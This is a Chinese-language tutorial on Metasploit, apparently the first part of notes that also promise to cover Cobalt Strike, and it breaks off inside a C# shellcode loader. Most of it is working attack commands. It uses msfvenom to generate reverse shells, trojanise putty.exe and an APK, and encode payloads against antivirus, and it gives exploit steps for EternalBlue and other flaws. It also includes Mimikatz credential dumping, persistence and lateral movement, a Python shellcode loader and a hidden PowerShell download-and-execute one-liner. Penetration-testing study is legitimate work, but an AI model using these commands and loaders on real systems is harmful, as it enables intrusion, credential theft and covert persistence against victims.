# MSF (Metasploit Framework) 与 Cobalt Strike 使用笔记

> 从零基础到精通 — 完整学习指南
> 涵盖环境搭建、核心概念、实战技巧、高级攻防与 OpSec 最佳实践

---

# 第一部分：Metasploit Framework (MSF)

---

## 第一章：概述与架构

### 1.1 什么是 Metasploit Framework

Metasploit 是目前最流行的渗透测试框架，由 Rapid7 维护。它是一个模块化平台，集成了漏洞利用（Exploit）、载荷生成（Payload）、信息收集、后渗透测试等一系列功能。

**核心组件架构：**

```
Metasploit Framework
├── msfconsole          # 主交互控制台
├── msfdb               # 数据库管理
├── msfvenom            # 载荷/编码器生成工具（取代旧版 msfpayload + msfencode）
├── modules/            # 模块目录
│   ├── exploits/       # 漏洞利用模块
│   ├── payloads/       # 载荷（shellcode）
│   ├── auxiliary/      # 辅助模块（扫描、检测、fuzz等）
│   ├── post/           # 后渗透模块
│   ├── encoders/       # 编码器（免杀/规避）
│   ├── nops/           # NOP 生成器
│   └── evasion/        # 规避模块
├── lib/                # 核心库（rex, msf/core 等）
├── plugins/            # 插件
├── scripts/            # 脚本（资源脚本、Meterpreter 脚本）
├── data/               # 模板、字典、payload 数据
└── tools/              # 独立工具（pattern_create 等）
```

### 1.2 版本分类

| 版本 | 说明 |
|------|------|
| **Metasploit Pro** | 商业版，含 Web UI、自动任务、社会工程套件、VPN pivoting |
| **Metasploit Pro Community** | 免费但受限（仅限 4 个工作区、1 个用户） |
| **Metasploit Framework (OSS)** | 开源版，命令行界面，功能完整 |
| **Metasploit Community Edition** | 介于 Framework 和 Pro 之间 |

**本笔记基于 Metasploit Framework (OSS) 开原版**，所有内容在 Kali Linux 中测试通过。

---

## 第二章：环境搭建

### 2.1 Kali Linux 安装（推荐）

Kali Linux 已预装 MSF，是最推荐的环境。

```bash
# 更新 MSF
sudo apt update && sudo apt install metasploit-framework -y

# 查看版本
msfconsole --version
```

### 2.2 在其他 Linux 上安装

```bash
# Debian/Ubuntu
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall

# 或使用包管理
sudo apt install metasploit-framework -y
```

### 2.3 配置数据库

MSF 使用 PostgreSQL 存储扫描结果、凭证、主机信息等。

```bash
# 初始化数据库
sudo msfdb init

# 启动/停止数据库
sudo msfdb start
sudo msfdb stop

# 重新初始化（如遇问题）
sudo msfdb reinit

# 查看状态
sudo msfdb status
```

### 2.4 启动与环境验证

```bash
# 启动控制台
msfconsole

# 在 msfconsole 中验证数据库连接
db_status
# 输出: [*] Connected to msf. Connection type: postgresql

# 查看帮助
help
help [module/command]
```

### 2.5 目录结构详解

```bash
# MSF 安装位置
/usr/share/metasploit-framework/

# 用户配置文件
~/.msf4/
├── config               # MSF 配置
├── local/               # 用户自定义模块
├── loot/                # 后渗透获取的数据
├── logs/                # 日志
└── history              # 命令历史
```

---

## 第三章：核心概念详解

### 3.1 模块体系

MSF 的所有功能以**模块（Module）** 形式组织，每个模块是一个 Ruby 文件。

#### Exploit（漏洞利用模块）
利用特定漏洞来执行代码的模块。

```bash
# 搜索 exploit 模块
search type:exploit platform:windows
search type:exploit cve:2021
search smb
search eternalblue

# 查看 exploit 信息
info exploit/windows/smb/ms17_010_eternalblue
```

#### Payload（载荷）
漏洞利用成功后执行的代码，定义"做什么"。

**两种主要类型：**

| 类型 | 说明 |
|------|------|
| **Stage（分阶段）** | 先发送小体积 stager，再下载完整 stage，体积小、免杀性好 |
| **Stageless（单阶段）** | 一次性发送完整 payload，体积大、更稳定 |

**常见连接方式：**

| 方向 | 方式 | 说明 |
|------|------|------|
| `reverse` | 反向连接 | 目标主动连接攻击机（最常见） |
| `bind` | 正向连接 | 攻击机连接目标开放的端口 |
| `reverse_https` | HTTPS 反向 | 加密流量，易穿透防火墙 |
| `reverse_tcp_rc4` | RC4 加密反向 | 自定义加密 key 规避检测 |
| `find_tag` | 标签连接 | 多连接环境下区分会话 |

**常用 payload：**

```bash
# Windows
windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_https
windows/meterpreter/reverse_tcp
windows/shell/reverse_tcp
windows/x64/shell_reverse_tcp       # stageless shell
windows/x64/meterpreter_reverse_tcp # stageless meterpreter

# Linux
linux/x64/meterpreter/reverse_tcp
linux/x64/shell/reverse_tcp

# Mac
osx/x64/meterpreter/reverse_tcp

# Android
android/meterpreter/reverse_tcp

# Python
python/meterpreter/reverse_tcp

# PHP
php/meterpreter/reverse_tcp

# Java
java/meterpreter/reverse_tcp
```

#### Auxiliary（辅助模块）
不直接执行 payload 的模块，用于信息收集、扫描、嗅探、DoS 等。

```bash
# 常用辅助模块分类
auxiliary/scanner/portscan/           # 端口扫描
auxiliary/scanner/smb/                # SMB 相关
auxiliary/scanner/http/               # HTTP 扫描
auxiliary/sniffer/                    # 嗅探
auxiliary/fuzzers/                    # 模糊测试
auxiliary/gather/                     # 信息收集
auxiliary/dos/                        # 拒绝服务
```

#### Post（后渗透模块）
进入目标系统后执行的模块，用于权限提升、凭证获取、信息收集等。

```bash
# 常用后渗透模块分类
post/windows/gather/                  # Windows 信息收集
post/windows/manage/                  # Windows 管理操作
post/windows/escalate/                # Windows 提权
post/linux/gather/                    # Linux 信息收集
post/multi/manage/                    # 跨平台管理
```

#### Encoder（编码器）
对 payload 进行编码以绕过 AV/IDS。

```bash
# 查看可用编码器
show encoders

# 常见编码器（按使用频率）
x64/xor              # 64位 XOR 编码
x86/shikata_ga_nai   # 最经典的多态编码器
x86/xor_dynamic      # 动态 XOR
x86/alpha_mixed      # ASCII 字母数字编码
x86/countdown        # 递减编码
x64/zutto_dekiru     # 64 位编码
```

> ⚠️ 编码器对现代 AV（如 Windows Defender）的绕过效果有限，仅编码很难免杀。

#### NOP（NOP 生成器）
生成 NOP 滑板指令（如 `\x90`），用于内存布局对齐。

```bash
show nops
```

#### Evasion（规避模块）
MSF 6.0+ 引入的专门用于防御规避的模块。

```bash
show evasion
```

### 3.2 载荷生成器：msfvenom

msfvenom 是 MSF 的独立载荷生成工具，替代了旧版的 msfpayload 和 msfencode。

**基础语法：**

```bash
msfvenom -p <payload> [options] -f <format> -o <output>
```

**常用参数：**

| 参数 | 作用 |
|------|------|
| `-p, --payload` | 指定 payload |
| `-f, --format` | 输出格式 |
| `-o, --out` | 输出文件 |
| `LHOST` | 监听 IP |
| `LPORT` | 监听端口 |
| `-e` | 指定编码器 |
| `-i` | 编码次数 |
| `-a` | 架构 |
| `--platform` | 平台 |
| `-b` | 坏字符（如 `\x00\xff`） |
| `-v` | 变量名（用于生成代码） |
| `-x` | 模板文件（捆绑到正常 exe） |
| `-k` | 保留模板原有行为 |
| `--encrypt` | 加密方式（base64, rc4 等） |

**常见输出格式：**

```bash
-f exe                 # Windows 可执行文件
-f exe-only            # 纯 exe 无模板
-f elf                 # Linux 可执行文件
-f raw                 # 原始 shellcode
-f python              # Python 代码
-f c                   # C 代码
-f csharp              # C# 代码
-f powershell          # PowerShell 脚本
-f hex                 # 十六进制
-f msi                 # MSI 安装包
-f vba                 # VBA 宏
-f asp                 # ASP 脚本
-f war                 # JSP WAR 包
-f macho               # Mac 可执行
```

**实战示例：**

```bash
# 🔹 基础 Windows meterpreter 反向连接
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# 🔹 使用编码器（多次编码）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x64/xor -i 5 -f exe -o encoded.exe

# 🔹 捆绑到正常程序
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x /path/to/putty.exe -k -f exe -o putty_backdoor.exe

# 🔹 Linux payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf

# 🔹 PHP shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# 🔹 ASP shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f asp -o shell.asp

# 🔹 Python shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o shell.py

# 🔹 生成 shellcode（raw 格式）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shellcode.bin

# 🔹 生成 C shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c -o shellcode.c

# 🔹 生成 PowerShell 一行命令
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f powershell -o shell.ps1

# 🔹 生成 HTTPS payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o https_shell.exe

# 🔹 生成带有坏字符限制的 shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b "\x00\x0a\x0d" -f c

# 🔹 生成 Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o backdoor.apk

# 🔹 生成 Base64 编码 payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 --encrypt base64 -f raw

# 🔹 生成宏 payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f vba -o macro.txt

# 🔹 列出所有 payload
msfvenom -l payloads

# 🔹 列出所有编码器
msfvenom -l encoders

# 🔹 查看 payload 选项
msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
```

### 3.3 负载类型详解

#### Stagers vs Stages

```
Stager（第一段代码，体积极小，约 200-500 字节）
     ↓ 连接攻击机
Stage（实际 meterpreter/shell DLL，从网络加载）
     ↓
Meterpreter/Session
```

**stager 类型：**

| Stager | 说明 |
|--------|------|
| `reverse_tcp` | TCP 反向连接（最基础） |
| `reverse_http` | HTTP 隧道传输 stage |
| `reverse_https` | HTTPS 隧道（加密） |
| `reverse_dns` | DNS 方式获取 stage |
| `bind_tcp` | TCP 正向连接 |
| `reverse_winhttp` | 使用 WinHTTP API 连接代理 |

**stageless payload（单阶段）：**

```bash
# 命名规则：payload 名中不含 "/" 分隔的 stager
# 如：windows/x64/meterpreter_reverse_tcp
#     对比 staged：windows/x64/meterpreter/reverse_tcp

# 不带 / 的是 stageless；带 / 的是 staged
```

### 3.4 Handler（监听器）

Handler 用于接收来自目标的连接（reverse payload）或连接目标（bind payload）。

```bash
# 手动设置监听器
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run

# 后台运行（放入作业）
run -j

# 查看作业
jobs
kill <job_id>
```

---

## 第四章：信息收集与侦察

### 4.1 数据库操作

```bash
# 创建/切换工作区
workspace -a pentest_target
workspace default
workspace -h

# 导入扫描结果
db_import /path/to/nmap.xml
db_import /path/to/nessus.xml

# 查看数据
hosts
services
vulns
notes
loot
creds
```

### 4.2 端口扫描

```bash
# MSF 内置扫描（较慢但可集成到数据库）
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set THREADS 50
set PORTS 1-10000
run

# 其他端口扫描模块
use auxiliary/scanner/portscan/syn
use auxiliary/scanner/portscan/ack
use auxiliary/scanner/portscan/ftpbounce

# 推荐: 使用 Nmap 扫描再导入（更快更全）
nmap -sS -sV -O -p- 192.168.1.100 -oA scan_result
db_import scan_result.xml
```

### 4.3 服务识别

```bash
# 服务指纹识别
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/http/http_version
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/telnet/telnet_version

# 设置并运行
set RHOSTS 192.168.1.100
set THREADS 10
run
```

### 4.4 操作系统识别

```bash
# SNMP 方式
use auxiliary/scanner/snmp/snmp_enum

# SMB 方式
use auxiliary/scanner/smb/smb_version

# TCP 指纹（基于响应差异）
use auxiliary/scanner/os/os_fingerprint
```

### 4.5 Web 应用扫描

```bash
# 目录暴力枚举
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set THREADS 20
run

# 文件枚举
use auxiliary/scanner/http/files_dir
use auxiliary/scanner/http/brute_dirs

# WebDAV 扫描
use auxiliary/scanner/http/webdav_scanner
use auxiliary/scanner/http/webdav_website_content

# 敏感文件检测
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/sitemap_xml

# 备份文件泄露检测
use auxiliary/scanner/http/backup_file

# 常见 Web 框架识别
use auxiliary/scanner/http/http_headers
use auxiliary/scanner/http/ssl

# SQL 注入漏洞检测
use auxiliary/scanner/http/sql_injection

# WAF 识别
use auxiliary/scanner/http/waf_detect
use auxiliary/scanner/http/waf_bypass
```

### 4.6 暴力破解模块

```bash
# SSH 爆破
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.0/24
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set THREADS 20
run

# FTP 爆破
use auxiliary/scanner/ftp/ftp_login

# SMB 爆破
use auxiliary/scanner/smb/smb_login

# MySQL 爆破
use auxiliary/scanner/mysql/mysql_login

# PostgreSQL 爆破
use auxiliary/scanner/postgres/postgres_login

# HTTP 表单爆破
use auxiliary/scanner/http/http_form
use auxiliary/scanner/http/wordpress_login

# RDP 爆破
use auxiliary/scanner/rdp/rdp_login

# Tomcat 管理后台爆破
use auxiliary/scanner/http/tomcat_mgr_login
```

### 4.7 网络嗅探与抓包

```bash
# 被动网络扫描（基于 ARP）
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
run

# UDP 服务发现
use auxiliary/scanner/discovery/udp_probe
use auxiliary/scanner/discovery/udp_sweep

# DNS 枚举
use auxiliary/gather/dns_info
use auxiliary/scanner/dns/dns_amp
```

---

## 第五章：漏洞利用（Exploitation）

### 5.1 搜索模块

```bash
# 基础搜索
search eternalblue
search ms17-010
search type:exploit name:tomcat
search cve:2021 type:exploit

# 按平台搜索
search platform:windows
search platform:linux
search platform:php

# 按 rank 搜索
search rank:excellent
search rank:great

# 组合搜索
search type:exploit platform:windows cve:2020 rank:excellent

# 按日期搜索
search date:2021
```

**Rank 等级说明：**

| Rank | 含义 |
|------|------|
| `excellent` | 几乎不会崩溃目标 |
| `great` | 可靠的利用，成功率很高 |
| `good` | 正常情况下可用 |
| `normal` | 可用但可靠性一般 |
| `average` | 成功率较低 |
| `low` | 不稳定，可能导致服务崩溃 |
| `manual` | 需要手动配置 |

### 5.2 基础利用流程

```bash
# 第1步：选择 exploit
use exploit/windows/smb/ms17_010_eternalblue

# 第2步：查看选项
show options
show targets
show payloads
show advanced

# 第3步：设置必选项
set RHOSTS 192.168.1.100
set RPORT 445

# 第4步：选择 payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444

# 第5步：检查目标是否易受攻击（可选）
check

# 第6步：执行利用
exploit
# 或后台方式
exploit -j
# 或指定 payload 自动选择
run -j
```

### 5.3 常见漏洞利用实战

#### EternalBlue (MS17-010)

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
check
exploit

# 如果 x64 版本失败，尝试 x86
use exploit/windows/smb/ms17_010_psexec
```

#### SMB 凭据重放 (MS08-067 - 经典)

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

#### Web 应用 RCE

```bash
# Tomcat 管理后台部署 WAR
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS 192.168.1.100
set RPORT 8080
set USERNAME tomcat
set PASSWORD tomcat
set PATH /manager
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST 192.168.1.100
exploit

# ThinkPHP 远程命令执行
use exploit/multi/http/thinkphp_rce
set RHOSTS 192.168.1.100
exploit
```

#### 文件上传 RCE

```bash
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS 192.168.1.100
set TARGETURI /wordpress
set USERNAME admin
set PASSWORD admin123
exploit
```

#### SSH 登录后执行

```bash
use exploit/multi/ssh/sshexec
set RHOSTS 192.168.1.100
set USERNAME root
set PASSWORD password
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```

#### PHP 应用程序 RCE

```bash
# PHP 代码执行
use exploit/multi/http/php_eval
set RHOSTS 192.168.1.100
set PHPURI /shell.php?cmd=
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```

#### MySQL 提权执行

```bash
use exploit/multi/mysql/mysql_udf_payload
set RHOSTS 192.168.1.100
set USERNAME root
set PASSWORD root
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```

#### 本地提权

```bash
# Windows 本地提权
use exploit/windows/local/ms16_075_reflection
# Juicy Potato 提权
use exploit/windows/local/ms16_075_reflection_juicy

# Linux 本地提权
use exploit/linux/local/overlayfs_priv_esc
use exploit/linux/local/pkexec
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec  # PwnKit
use exploit/linux/local/cve_2022_0847_dirtypipe            # Dirty Pipe
```

### 5.4 自动利用（AutoExploit）

```bash
# db_autopwn（自动匹配 exploit）
# 注意：需要先在数据库中导入目标信息
db_nmap 192.168.1.100
use auxiliary/server/browser_autopwn2

# 自动提权模块
use post/multi/recon/local_exploit_suggester
# 在 meterpreter 会话中运行
run post/multi/recon/local_exploit_suggester
```

### 5.5 会话管理

```bash
# 查看所有会话
sessions
sessions -l

# 与指定会话交互
sessions -i 1

# 将会话放到后台
background  # 或 Ctrl+Z

# 关闭会话
sessions -k 1
sessions -K  # 关闭所有会话

# 升级 shell 到 meterpreter
sessions -u 1

# 给会话命名
sessions -n shell01 -i 1
```

### 5.6 资源脚本自动化

资源脚本可自动化重复操作。

```bash
# 创建自动监听脚本
cat > /tmp/listener.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set ExitOnSession false
run -j
EOF

# 执行资源脚本
msfconsole -r /tmp/listener.rc
# 或在 msfconsole 中
resource /tmp/listener.rc
```

### 5.7 自动攻击脚本

```bash
# 多目标自动化攻击
cat > /tmp/auto_scan.rc << 'EOF'
workspace -a auto_pentest
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
set PORTS 21,22,23,80,443,445,8080,8443,3306,3389
set THREADS 50
run

db_services

use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.100
run
EOF
```

---

## 第六章：Meterpreter 深度解析

Meterpreter 是 MSF 的"瑞士军刀"——它是一个运行在目标内存中的动态扩展 payload，不写磁盘，通过加密信道通信。

### 6.1 Meterpreter 优势

- **内存加载**：不写入磁盘，规避文件扫描
- **加密通信**：默认使用 AES + TLS 加密
- **动态扩展**：可在运行时加载新功能
- **进程迁移**：可注入到其他进程
- **文件系统隔离**：使用自己的文件系统 API

### 6.2 核心命令

#### 系统信息

```meterpreter
sysinfo                   # 系统信息（OS、架构、语言等）
getuid                    # 当前用户身份
getsystem                # 提权到 SYSTEM
getprivs                 # 获取当前特权
getpid                   # 当前进程 PID
ps                       # 进程列表
pgrep notepad.exe        # 按名称搜索进程
migrate <PID>            # 迁移到其他进程
```

#### 网络

```meterpreter
ipconfig / ifconfig      # 网络配置
route                    # 路由表
netstat                  # 网络连接
arp                      # ARP 缓存
getproxy                 # 代理设置
portfwd add -l 8888 -p 3389 -r 127.0.0.1  # 端口转发
```

#### 文件操作

```meterpreter
pwd                      # 查看当前目录
cd                       # 切换目录
ls                       # 列出文件
search -f *.docx         # 搜索文件
cat file.txt             # 查看文件内容
upload /tmp/1.exe C:\\   # 上传文件
download C:\\file.txt    # 下载文件
edit file.txt            # 编辑文件
rm file.txt              # 删除文件
mkdir                    # 创建目录
rmdir                    # 删除目录
mv                       # 移动/重命名
checksum md5 file.exe    # 计算文件哈希
```

#### 用户操作

```meterpreter
getuid                   # 当前用户
getsystem                # 提权到 SYSTEM
execute -f cmd.exe -c    # 执行命令（-c 渠道化输出）
execute -H -f notepad    # 隐藏执行（-H 隐藏）
shell                    # 获取系统 shell
rev2self                 # 恢复原始令牌
```

#### 屏幕与桌面

```meterpreter
screenshot               # 截屏
enumdesktops             # 枚举桌面
getdesktop               # 获取当前桌面
setdesktop               # 切换桌面
keyscan_start            # 开始键盘记录
keyscan_dump             # 导出键盘记录
keyscan_stop             # 停止键盘记录
uictl enable keyboard    # 启用键盘控制
uictl disable mouse      # 禁用鼠标
```

### 6.3 特权提升

```meterpreter
# 自动提权
getsystem

# 列出可用的本地提权漏洞
run post/multi/recon/local_exploit_suggester

# Bypass UAC
run post/windows/manage/run_as_admin
run post/windows/escalate/bypassuac_inject
run post/windows/escalate/bypassuac_eventvwr
run post/windows/escalate/bypassuac_comhijack

# 使用令牌窃取
steal_token <PID>        # 窃取其他进程令牌
drop_token               # 丢弃令牌
incognito                # 加载 incognito 模块
list_tokens -u           # 列出可用令牌
impersonate_token NT AUTHORITY\\SYSTEM  # 模拟令牌
```

### 6.4 凭证获取

```meterpreter
# 哈希抓取
hashdump                 # 抓取 SAM 哈希（需要 SYSTEM 权限）
run post/windows/gather/smart_hashdump   # 智能哈希抓取
run post/windows/gather/cachedump        # 抓取域缓存
run post/windows/gather/mem_dump         # 内存转储

# Mimikatz（米玛卡兹）
load mimikatz
mimikatz_command -f sekurlsa::logonPasswords  # 获取明文密码
mimikatz_command -f sekurlsa::wdigest
mimikatz_command -f kerberos::list
mimikatz_command -f lsadump::sam

# Kiwi（内置 Mimikatz 简化版）
load kiwi
creds_all                # 获取所有凭证
creds_msv                # MSV 凭证
creds_ssp                # SSP 凭证
creds_tspkg              # TSPKG 凭证
creds_kerberos           # Kerberos 凭证
creds_wdigest            # WDigest 凭证
kiwi_cmd "privilege::debug sekurlsa::logonPasswords"
lsa_dump_sam             # LSA SAM 转储
lsa_dump_secrets         # LSA 密钥转储
wifi_list                # 列出 WiFi 密码
```

### 6.5 持久化（后门安装）

```bash
# 🔴 注意：持久化操作非常敏感，授权测试才能做

# Windows 持久化
run persistence -X -i 30 -p 4444 -r 192.168.1.100
# -X: 开机自启
# -i: 重连间隔
# -p/r: 端口/地址

run exploit/windows/local/persistence
run post/windows/manage/persistence_exe

# 服务持久化
run post/windows/manage/install_service

# WMI 事件持久化
run post/windows/manage/wmi_persistence

# 计划任务持久化
run post/windows/manage/scheduled_task

# Linux 持久化
run post/linux/manage/sshkey_persistence
run post/linux/manage/cron_persistence
```

### 6.6 横向移动

```meterpreter
# 使用已获取的凭证
run post/windows/gather/enum_shares
run post/windows/manage/forward_p2p

# SMB 横向移动
use exploit/windows/smb/psexec
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set RHOSTS 192.168.1.101
set SMBDomain WORKGROUP
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
exploit

# SMBExec（管理员权限）
use exploit/windows/smb/smbexec

# WMI 横向移动
use auxiliary/scanner/smb/impacket/wmiexec

# WinRM 横向移动
use exploit/windows/winrm/winrm_script_exec
```

### 6.7 Pivoting（跳板）

```meterpreter
# 添加路由（通过当前会话访问内网）
run autoroute -s 10.10.10.0/24
run autoroute -p  # 查看路由

# 或者手动添加
route add 10.10.10.0 255.255.255.0 1  # 通过 session 1

# socks 代理
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j

# 端口转发（将目标 3389 转发到本地 8888）
portfwd add -L 0.0.0.0 -l 8888 -p 3389 -r 127.0.0.1
# 现在可连接 rdesktop 127.0.0.1:8888

# 反向端口转发
portfwd add -R -L 0.0.0.0 -l 4444 -p 4444 -r 127.0.0.1
```

### 6.8 信息收集模块

```meterpreter
# Windows 信息收集
run post/windows/gather/checkvm                 # 检测虚拟机
run post/windows/gather/enum_logged_on_users    # 枚举登录用户
run post/windows/gather/enum_applications       # 枚举安装软件
run post/windows/gather/enum_patches             # 补丁信息
run post/windows/gather/enum_services           # 服务列表
run post/windows/gather/enum_shares             # 共享目录
run post/windows/gather/enum_snmp               # SNMP 配置
run post/windows/gather/enum_termsrv            # 远程桌面会话
run post/windows/gather/dumplinks               # 桌面快捷方式
run post/windows/gather/injected_dll            # 检测 DLL 注入

# 网络信息收集
run post/windows/gather/tcpnetstat              # TCP 连接状态
run post/windows/gather/arp_scanner             # ARP 扫描内网
run auxiliary/scanner/portscan/tcp              # 通过会话扫描

# 浏览器信息收集
run post/windows/gather/enum_chrome             # Chrome 数据
run post/windows/gather/enum_ie_history          # IE 历史

# Linux 信息收集
run post/linux/gather/enum_network              # 网络信息
run post/linux/gather/enum_users_history        # 用户历史
run post/linux/gather/enum_configs              # 配置文件
run post/linux/gather/checkcontainer            # 检测容器环境
run post/linux/gather/checkvm                   # 检测虚拟化
run post/linux/gather/enum_protections          # 防护措施
```

### 6.9 Meterpreter 扩展加载

```meterpreter
# 加载扩展
load incognito           # 令牌操作
load mimikatz            # 密码抓取
load kiwi                # 简化 Mimikatz
load powershell          # PowerShell 环境
load python              # Python 环境
load espia               # 屏幕/音频监控
load sniffer             # 网络嗅探
load net                 # 网络操作
load dns                 # DNS 操作
load extapi              # 扩展 API（窗口管理、服务等）
load priv                # 提权相关

# 卸载扩展
unload mimikatz

# 查看已加载扩展
help
```

---

## 第七章：高级技术

### 7.1 免杀与规避

#### 编码（基础但已失效）

```bash
# Shikata ga nai 多态编码
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 \
  -e x64/xor -i 10 -f exe -o encoded.exe
```

#### 模板文件绑定

```bash
# 绑定到正常程序
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 \
  -x /usr/share/windows-binaries/putty.exe -k -f exe -o putty_patched.exe
```

#### 自定义编码器

```bash
# 使用自定义 XOR 密钥
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 \
  --encrypt xor --encrypt-key "MySecretKey123" -f exe -o xored.exe

# Base64 编码
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 \
  --encrypt base64 -f raw
```

#### HTTPS 监听器（流量加密）

```bash
# 生成证书
openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \
  -keyout /tmp/meterpreter.key -out /tmp/meterpreter.crt

# 合并为 PEM
cat /tmp/meterpreter.key /tmp/meterpreter.crt > /tmp/meterpreter.pem

# 设置 HTTPS handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 192.168.1.100
set LPORT 443
set HandlerSSLCert /tmp/meterpreter.pem
set StagerVerifySSLCert false
run -j
```

#### 使用 IPv6 或域名

```bash
# 使用域名连接（避免 IP 检测）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=cdn.example.com LPORT=443 -f exe -o payload.exe

# handler 设置
set LHOST 0.0.0.0
set ReverseListenerBindAddress 0.0.0.0
set ReverseListenerComm eth0
```

### 7.2 shellcode 注入技术

#### Python 加载器

```python
# shellcode_loader.py
import ctypes
import urllib.request
import base64

# 从远程服务器获取 shellcode
response = urllib.request.urlopen("http://192.168.1.100/shellcode.bin")
shellcode = response.read()

# 或者直接从 MSF 生成后嵌入
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=X -f python

# 执行 shellcode
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40)      # PAGE_EXECUTE_READWRITE
)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    shellcode,
    ctypes.c_int(len(shellcode))
)
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
```

#### PowerShell 内存加载

```powershell
# 直接在内存中执行（无文件落地）
powershell -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1'))"

# 使用反射加载
$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.1.100/shellcode.bin')
[System.Reflection.Assembly]::Load($bytes)
```

#### C# Shellcode 加载器

```csharp
using System;
using System.Runtime.InteropServices;
using System.Net;

namespace SharpLoader
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("ntdll.dll", SetLastError = true)]
